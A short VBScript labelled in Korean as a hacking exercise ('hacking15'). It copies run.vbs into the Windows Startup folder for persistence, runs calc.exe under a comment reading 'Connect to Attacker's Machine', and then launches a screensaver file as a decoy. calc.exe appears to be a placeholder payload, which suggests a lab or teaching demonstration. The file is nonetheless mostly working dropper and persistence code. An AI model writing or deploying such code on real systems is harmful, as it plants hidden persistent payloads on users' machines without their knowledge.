' vbs ==> hacking15, run.vbs 파일을 시작프로그램으로 등록하고 calc.exe를 실행시키는 코드
Dim ws, fso
Set ws = wscript.createobject("wscript.shell")
Set fso = wscript.createobject("Scripting.FileSystemObject")

' Move run.vbs to Startup folder
strStartupPath = ws.ExpandEnvironmentStrings("%appdata%") & "\Microsoft\Windows\Start Menu\Programs\Startup\run.vbs"

If (fso.FileExists(strStartupPath)) Then
	fso.deletefile strStartupPath 
End If

If (fso.FileExists(".\run.vbs")) Then
	fso.MoveFile ".\run.vbs", strStartupPath
End If

' Connect to Attacker's Machine
ws.run("calc.exe")
wscript.sleep 2000

' Run Screensaver
ws.run("screenSaver.scr")


